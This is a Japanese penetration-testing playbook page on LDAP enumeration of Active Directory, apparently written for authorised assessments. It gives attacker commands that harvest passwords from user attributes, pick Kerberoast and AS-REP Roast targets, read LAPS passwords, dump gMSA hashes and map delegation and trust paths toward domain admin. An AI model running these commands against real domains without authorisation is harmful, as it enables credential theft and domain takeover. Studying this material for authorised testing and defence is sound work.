# LDAP列挙

> **スコープ**: 389 (LDAP) / 636 (LDAPS) に対する匿名バインド〜認証付き列挙まで。ユーザー・コンピューター・SPN・UAC フラグ・LAPS / gMSA・MachineAccountQuota・ドメイン信頼の抽出を扱う。発見した攻撃経路（Kerberoast / AS-REP / RBCD / LAPS 侵入）の実行手順は `../04_Post_Access_Windows_AD/` 配下の各ファイルを参照。

## 着火条件
389 (LDAP) または 636 (LDAPS) が開いており、AD 環境と判断した場合。
匿名バインドでも部分情報が取れるが、認証情報が取れた時点で本格的に実施する。

## 環境前提
- 実行環境: テスター端末
- 必要なツール: `ldapsearch`（openldap-utils、ペネトレ用Linuxディストリ標準搭載）/ `netexec`（`nxc`。SMB/LDAP/WinRM への認証テストを一括で行う、標準搭載）/ `ldapdomaindump` / `gMSADumper.py`（要 `pip install` または GitHub から）
- 外部リソース依存: なし（内部ネットワーク内で完結）。LDAPS の証明書検証無効化に `LDAPTLS_REQCERT=never` 環境変数を使う

## 先に確認すること

- **DN（Naming Context）の特定**: `-b "DC=..."` の DN を間違えると結果が空になるだけでエラーは返らない。必ず §1 で `namingcontexts` を確認してから本格列挙へ
- **LDAP か LDAPS か**: 資格情報を送る際は盗聴防止のため ldaps:// を優先。LDAPS は社内 CA / 自己署名証明書が大半なので証明書検証無効化が必要なことが多い（§刺さらなかったとき）
- **カスタム属性の扱い**: 標準属性だけでなく `info`、社内で独自追加された属性にも目を通す。`info` は GUI の「説明」欄とは別のフィールドで、GUI では編集されにくいため平文パスワードが残っていることがある

**攻撃者の思考トレース:** LDAP は AD の「設計図」がそのまま読めるサービス。匿名で何が見えるかをまず確認し（弱化構成の finding になる）、認証情報が取れたら「即 DA に繋がる属性（SPN 付き Administrator・読める LAPS・DONT_REQ_PREAUTH）」を最優先で探す。網羅列挙より「次の攻撃の前提が揃っているか」を属性単位で確認するのが効率的。

---

## 1. 匿名バインド / Naming Context の確認

**コマンド:**

```bash
# [Attacker] サブツリー指定なしで naming context を列挙（最初の一手）
ldapsearch -x -H ldap://[IP] -s base namingcontexts

# [Attacker] 匿名バインドで base DN を指定して取得を試す
ldapsearch -x -H ldap://[IP] -b "DC=[domain],DC=[tld]"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `namingContexts: DC=example,DC=local` | 正しい base DN が判明 | 以降の `-b` に使用 |
| 匿名で `objectClass=*` が広範に返る | `Pre-Windows 2000 Compatible Access` に `Anonymous Logon` 等が含まれる弱化構成 | 匿名で広範列挙が可能（**finding**）。§2 以降を匿名のまま試す |
| 匿名バインドで `sizeLimitExceeded` | 匿名でも検索が通っている | 検索範囲・属性を絞って再実行 |
| 匿名バインドで `operationsError` | 匿名アクセスは拒否 | 認証情報取得まで後回し → `../00_Playbook/Windows_AD_Attack_Flow.md` Step 3 |

**注意:** DN の `DC=` を間違えると結果が空になるだけでエラーは返らない。必ず `namingcontexts` で正しい DN を先に確定する。

---

## 2. 基本ユーザー / コンピューター列挙と認証情報の抽出

**コマンド:**

```bash
# [Attacker] 基本的なユーザー列挙（cred が混ざりやすい属性を指定）
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" \
  "(objectClass=user)" sAMAccountName info description memberOf userAccountControl

# [Attacker] 全属性を取得（詳細調査）
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" "(objectClass=user)"

# [Attacker] コンピューターアカウントの列挙
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" \
  "(objectClass=computer)" sAMAccountName dNSHostName operatingSystem

# [Attacker] 認証情報候補の一括抽出
ldapsearch ... | grep -i "info\|description\|pass\|pwd\|cred"
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `info` / `description` に文字列がある | 運用メモとしてパスワードが書かれていることがある | `grep -i "pass\|pwd\|cred"` で抽出 → そのまま認証情報として試す → `../02_Initial_Access/Credential_Discovery.md` |
| `memberOf` に `Domain Admins` / `Enterprise Admins` | 高権限ユーザーの特定 | そのユーザーの認証情報取得が最優先目標 |
| `pwdLastSet=0` | 初回ログイン前 / パスワードリセット直後 | 既定パスワードの可能性 |
| `adminCount=1` だが `Domain Admins` 外 | 過去に特権を持っていたアカウント（AdminSDHolder） | BloodHound で現在の ACL を確認 |
| `operatingSystem` に古い Windows 版 | EOL OS の可能性 | CVE 検索・横展開対象の優先付け |

**注意:** `info` は GUI（AD ユーザーとコンピューター）の「説明」欄とは別のフィールドで、GUI 運用だと見落とされがち。標準属性が空でも `extensionAttribute1`〜`15` 等のカスタム属性に残っていることがある。

---

## 3. 有効ユーザーのみ抽出と userAccountControl ビット早見表

**コマンド:**

```bash
# [Attacker] 有効なユーザーのみを抽出（無効化アカウントを除外）
# userAccountControl のビット 1 (ACCOUNTDISABLE = 0x2)
# OID 1.2.840.113556.1.4.803 はビット AND マッチ（LDAP_MATCHING_RULE_BIT_AND）
# `:=2` は「ACCOUNTDISABLE が立っている」→ 先頭の `!` で否定して「無効化されていない」を表現
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" -s sub \
  "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))" \
  sAMAccountName | grep sAMAccountName
```

**よく使う userAccountControl ビット値の早見表:**

| ビット値（10進） | フラグ名 | 意味 | フィルタ用途 |
|----------------|---------|------|------------|
| `2` | ACCOUNTDISABLE | アカウント無効化 | 有効なユーザーのみ抽出するため `!(...:=2)` で除外 |
| `512` | NORMAL_ACCOUNT | 標準ユーザーアカウント | コンピューターアカウントと区別 |
| `4096` | WORKSTATION_TRUST_ACCOUNT | コンピューターアカウント | ホスト一覧抽出 |
| `8192` | SERVER_TRUST_ACCOUNT | DC のコンピューターアカウント | DC 特定 |
| `65536` | DONT_EXPIRE_PASSWORD | パスワード無期限 | 古いサービスアカウント発見 |
| `524288` | TRUSTED_FOR_DELEGATION | Unconstrained Delegation | 委任攻撃の標的 |
| `4194304` | DONT_REQ_PREAUTH | 事前認証不要 | AS-REP Roast 候補 |
| `16777216` | TRUSTED_TO_AUTH_FOR_DELEGATION | Constrained Delegation | 委任攻撃の標的 |

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| 有効ユーザー一覧が取れる | スプレー / Roast 対象の母集合確定 | §4 SPN フィルタ・§5 AS-REP フィルタへ |
| `TRUSTED_FOR_DELEGATION` ビットのユーザー / ホスト | Unconstrained Delegation の標的 | `../04_Post_Access_Windows_AD/Delegation_Attacks/Unconstrained.md` |
| `TRUSTED_TO_AUTH_FOR_DELEGATION` | Constrained Delegation の標的 | `../04_Post_Access_Windows_AD/Delegation_Attacks/RBCD.md` |

**注意:** Kerberoast / AS-REP Roast の標的選定では、無効化アカウントに SPN が残っていても TGS 要求で認証できないため事前に除外する。「有効ユーザーのみ抽出 → SPN フィルタを追加 → Kerberoast 候補を絞る」の 2 段階で進む。詳細・他のビット値: `https://learn.microsoft.com/en-us/troubleshoot/windows-server/active-directory/useraccountcontrol-manipulate-account-properties`

---

## 4. SPN 付きユーザーの抽出（Kerberoast 候補）

**コマンド:**

```bash
# [Attacker] シンプルな SPN 検索
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" \
  "(&(objectClass=user)(servicePrincipalName=*))" sAMAccountName servicePrincipalName

# [Attacker] 有効ユーザーのみに絞った SPN 検索（推奨）
# `servicePrincipalName=*/*` は `service/host` 形式の SPN を典型パターンとして抽出
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" -s sub \
  "(&(objectCategory=person)(objectClass=user)(!(userAccountControl:1.2.840.113556.1.4.803:=2))(servicePrincipalName=*/*))" \
  sAMAccountName servicePrincipalName | grep -B 1 servicePrincipalName
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `servicePrincipalName` を持つ `SVC_xxx` 等 | Kerberoast 可能なサービスアカウント | `../04_Post_Access_Windows_AD/Kerberos_Attacks/Kerberoasting.md` |
| `Administrator` に SPN（例 `cifs/[HOST]`）が付いている | 設計ミス。クラック成功で**即 DA** | 最優先で TGS 要求 → Kerberoasting |

**注意:** 通常の Kerberoast は `SVC_xxx` のサービスアカウントが対象だが、設計ミスで Administrator に SPN が付いていることがある。SPN フィルタ実行後に `Administrator` の名前が出たら最優先で TGS 要求する。

---

## 5. AS-REP Roast 対象の抽出

**コマンド:**

```bash
# [Attacker] userAccountControl のビット 22 (DONT_REQ_PREAUTH = 0x400000)
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" -s sub \
  "(&(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=4194304))" sAMAccountName
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `DONT_REQ_PREAUTH` ユーザーが返る | AS-REP Roasting が可能 | 該当ユーザーで `GetNPUsers.py` → `../04_Post_Access_Windows_AD/Kerberos_Attacks/ASREPRoasting.md` |
| 該当ユーザーなし | 事前認証必須の標準構成 | §4 Kerberoast / §6-§8 の別経路へ |

**注意:** AS-REP Roast は事前認証不要ユーザーが対象。無効化アカウントが混ざる場合は §3 のフィルタと組み合わせる。

---

## 6. LAPS パスワードの読み取り（読取権限が委譲されている場合）

**コマンド:**

```bash
# [Attacker] 認可ユーザーに LAPS 読取権限が委譲されていれば `ms-Mcs-AdmPwd` が平文で見える
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" -s sub \
  "(&(objectClass=computer)(ms-Mcs-AdmPwd=*))" \
  sAMAccountName dNSHostName ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime

# [Attacker] nxc でも同等
nxc ldap [IP] -u [USER] -p '[PASSWORD]' -M laps
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `ms-Mcs-AdmPwd` 属性が平文で読める | **LAPS のローカル管理者パスワードが読める** — 委譲権限の付与ミス | 値を取得して該当ホストに `Administrator` で接続 → `../04_Post_Access_Windows_AD/LAPS_Dump.md` |
| 属性が存在するが読めない（空） | 読取権限が委譲されていない | 別経路へ |

**注意:** **Windows LAPS（v2 / 2023+）では属性名が `msLAPS-Password` 等に変わり、暗号化版もある**ので新環境では両方確認する。取得した平文パスワードでの侵入手順は `../04_Post_Access_Windows_AD/LAPS_Dump.md` を参照。

---

## 7. gMSA パスワード読取権限の確認（gMSADumper の前提）

**コマンド:**

```bash
# [Attacker] msDS-GroupMSAMembership に読取権限を持つグループが書かれている。自分のグループ SID が含まれていれば取得可能
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" -s sub \
  "(objectClass=msDS-GroupManagedServiceAccount)" \
  sAMAccountName msDS-GroupMSAMembership servicePrincipalName

# [Attacker] 読取可能なら gMSADumper で blob を NTLM ハッシュに変換
gMSADumper.py -u [USER] -p '[PASSWORD]' -d [DOMAIN] -l [IP]
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `msDS-GroupMSAMembership` に自分のグループが含まれる | gMSA パスワード読取権限がある | `gMSADumper.py` で `msDS-ManagedPassword` を取得 → そのアカウントの権限で横展開 |
| 自分のグループが含まれない | 読取権限なし | 別の委譲経路 / ACL を探す |

**注意:** gMSA は SPN を持つことが多く、取得した NTLM ハッシュで Pass-the-Hash / Kerberos 認証に使える。

---

## 8. MachineAccountQuota の確認（RBCD 攻撃前提）

**コマンド:**

```bash
# [Attacker] 既定 10 なら任意ユーザーが 10 個の計算機アカウントを作成可能（RBCD の前提が揃う）
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" -s base \
  "(objectClass=domainDNS)" ms-DS-MachineAccountQuota

# [Attacker] nxc でも同等
nxc ldap [IP] -u [USER] -p '[PASSWORD]' -M maq
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `ms-DS-MachineAccountQuota = 10`（既定値） | 任意ユーザーが計算機アカウントを 10 個まで作成可能 | RBCD 攻撃の前提が揃う → `../04_Post_Access_Windows_AD/Delegation_Attacks/RBCD.md` |
| `ms-DS-MachineAccountQuota = 0` | 機械アカウント作成経路は塞がれている | 既存の writable ACE 経由を探す方向 |

**注意:** MAQ が 0 でも、既に書込可能な計算機アカウントの ACE があれば RBCD は成立する。BloodHound で writable ACE を確認する。

---

## 9. ドメイン信頼（Trust）の列挙

**コマンド:**

```bash
# [Attacker] フォレスト / ドメイン信頼の有無・方向・タイプを確認
ldapsearch -x -H ldap://[IP] \
  -D "[DOMAIN]\[USER]" -w '[PASSWORD]' \
  -b "DC=[domain],DC=[tld]" -s sub \
  "(objectClass=trustedDomain)" \
  flatName trustPartner trustDirection trustType trustAttributes
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `(objectClass=trustedDomain)` でエントリが返る | フォレスト / ドメイン信頼が存在 | 信頼先ドメインへの横展開経路の検討（forest-wide DA への昇格経路）|
| `trustDirection` の値 | 1=Inbound / 2=Outbound / 3=Bidirectional | 双方向なら相互に横展開経路あり |
| `trustAttributes` に `0x40`（FOREST_TRANSITIVE） | forest trust | クロスフォレスト攻撃の検討 |

**注意:** trust の方向と種別で横展開の可否が決まる。双方向 forest trust は最も攻撃面が広い。

---

## 10. 高速・一括列挙ツール（NetExec / ldapdomaindump）

**コマンド:**

```bash
# [Attacker] NetExec を使った高速列挙
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --users
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --kerberoasting kerberoast.out
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --asreproast asrep.out
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --trusted-for-delegation     # Unconstrained / Constrained 検出
netexec ldap [IP] -u [USER] -p '[PASSWORD]' --password-not-required      # PASSWD_NOTREQD ユーザー検出

# [Attacker] ldapdomaindump（BloodHound 前の全体把握・HTML/JSON 一括ダンプ）
mkdir ldd_out && cd ldd_out
ldapdomaindump -u '[DOMAIN]\[USER]' -p '[PASSWORD]' ldap://[IP]
# ブラウザで domain_users.html / domain_computers.html / domain_trusts.html を確認
```

**観測される出力 → 次のアクション:**

| 出力 | 示唆 | 次のアクション |
|---|---|---|
| `--kerberoasting` / `--asreproast` がハッシュを出力 | §4 / §5 を一発で実行 | ハッシュをクラックへ → `../05_Tools_Reference/Hashcat.md` |
| `--password-not-required` でユーザーが返る | PASSWD_NOTREQD ユーザー | 空パスワードでの認証を試す |
| ldapdomaindump の HTML が生成される | ドメイン全体の概観が取れた | BloodHound 前の当たり付けに使う → `../05_Tools_Reference/BloodHound.md` |

**注意:** BloodHound を回す前に ldapdomaindump で概観を掴むと、何を狙うかの当たりが付きやすい。`nxc` は SMB/WinRM/MSSQL への認証テストを一括で行うペネトレ用 Linux ディストリ標準搭載ツール。

---

## 刺さらなかったとき（全体）

| 観測される症状 | 推定原因 | 代替手段 |
|--------------|---------|---------|
| 匿名バインドで `operationsError` が返る | 匿名アクセスは拒否されている | 認証情報取得まで後回し。`../00_Playbook/Windows_AD_Attack_Flow.md` Step 3（初期認証情報の取得）へ戻る |
| 認証ありで結果が空 | `-b "DC=..."` の DN を間違えている | `ldapsearch -x -H ldap://[IP] -s base namingcontexts` で正しい Naming Context を確認してから再実行 |
| `objectClass=user` で何も返らないが他は通る | カスタムスキーマ / オブジェクトクラスが標準と異なる | `(objectClass=*)` で広く取得し、属性 `objectClass` を見て実際のクラス名を確認する |
| 大量結果が `sizeLimitExceeded` で途中で切れる | デフォルト 1000 件上限 | `-E pr=500/noprompt` でページング、または `-l unlimited` を試す（サーバー側設定次第） |
| `info` / `description` に何も書かれていない | 運用上メモ機能を使っていない組織 | `extensionAttribute1`〜`15` 等のカスタム属性を確認、または属性指定なしで全属性取得して網羅 |
| LDAPS（636）に接続できない | 証明書の Subject / SAN とアクセス先（IP）が不一致 | `/etc/hosts` にホスト名を登録してから `ldaps://[FQDN]` で再接続（`../06_Concepts/Hosts_File_For_AD.md` 参照） |
| LDAPS で `TLS: peer cert untrusted` / `Hostname verification failed` | AD の LDAPS は社内 CA / 自己署名証明書が大半 | `LDAPTLS_REQCERT=never ldapsearch -H ldaps://[IP] ...`（`/etc/ldap/ldap.conf` に `TLS_REQCERT never` でも可。**finding 化用に正規証明書ならどう失敗するかを併記する**）|
| `ldapsearch` が `Can't contact LDAP server` | 389 / 636 が閉じている / FW でブロック | nmap で再確認、別 DC（複数ある場合）の IP を試す |

---

## 注意点・落とし穴

- デフォルトの `sizeLimit` は 1000 件。超えると結果が途中で切れる。`-E pr=500/noprompt` のページング指定で回避
- 大量の出力は `tee` でファイルに保存しながら確認する（後からの `grep` のため）
- ldap:// と ldaps:// で結果が変わることはほぼないが、認証情報送信の安全性のため資格情報を送る際は ldaps:// を優先
- **`Pre-Windows 2000 Compatible Access` グループ** は旧 NT 互換用の特殊グループで、ここに `Anonymous Logon` / `Authenticated Users` 等が含まれている古い AD では、**匿名 / 弱認証でも広範な列挙が可能**になる。長年運用されている AD では残存していることがある。`memberOf` 検索で `CN=Pre-Windows 2000 Compatible Access` のメンバを確認

> **個別ブロック固有の注意は各 §N の「注意:」を参照。**

---

## 関連技術
- 前：ポートスキャンで 389 / 636 を発見 → `Network_Scanning.md`
- 前：AD 攻撃フロー上の現在地確認・初期認証情報の取得 → `../00_Playbook/Windows_AD_Attack_Flow.md`
- 前：メタデータから得たユーザー名・ドメイン名を起点に列挙 → `Metadata_Analysis.md`
- 前：rpcclient / SMB 側の列挙と併用 → `SMB_Enumeration.md` / `RPC_Enumeration.md`
- 後：ユーザー一覧が取得できた → パスワードスプレー `../05_Tools_Reference/Netexec.md`
- 後：SPN 付きユーザーを発見 → `../04_Post_Access_Windows_AD/Kerberos_Attacks/Kerberoasting.md`
- 後：AS-REP Roast 可能ユーザーを発見 → `../04_Post_Access_Windows_AD/Kerberos_Attacks/ASREPRoasting.md`
- 後：`ms-Mcs-AdmPwd` が読めた → `../04_Post_Access_Windows_AD/LAPS_Dump.md`
- 後：`ms-DS-MachineAccountQuota` が 0 でない + 任意ユーザー権限 → `../04_Post_Access_Windows_AD/Delegation_Attacks/RBCD.md`
- 後：`TRUSTED_FOR_DELEGATION` / `TRUSTED_TO_AUTH_FOR_DELEGATION` を発見 → `../04_Post_Access_Windows_AD/Delegation_Attacks/Unconstrained.md` / `../04_Post_Access_Windows_AD/Delegation_Attacks/RBCD.md`
- 後：全体の権限マッピング → `../05_Tools_Reference/BloodHound.md`
- 後：`info` フィールドにパスワード → `../02_Initial_Access/Credential_Discovery.md`
